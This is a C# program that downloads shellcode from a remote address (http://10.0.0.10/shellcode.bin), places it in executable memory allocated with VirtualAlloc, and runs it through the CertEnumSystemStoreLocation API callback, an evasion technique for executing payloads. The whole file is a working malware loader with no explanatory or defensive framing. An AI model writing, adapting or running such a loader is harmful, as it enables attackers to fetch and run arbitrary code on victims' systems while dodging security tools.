using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace CertEnumSystemStoreLocation
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string url = "http://10.0.0.10/shellcode.bin";
            System.Net.WebClient client = new System.Net.WebClient();
            byte[] shellcode = client.DownloadData(url);

            IntPtr addr = VirtualAlloc(IntPtr.Zero, shellcode.Length, 0x3000, 0x40);
            Marshal.Copy(shellcode, 0, addr, shellcode.Length);

            CertEnumSystemStoreLocation(IntPtr.Zero, IntPtr.Zero, addr);


        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, int flAllocationType, int flProtect);

        [DllImport("Crypt32.dll", EntryPoint = "CertEnumSystemStoreLocation", CharSet = CharSet.Unicode, SetLastError = true)]
        static extern bool CertEnumSystemStoreLocation(IntPtr pwszStoreLocation, IntPtr Reserved, IntPtr pfnEnum);
    }
}

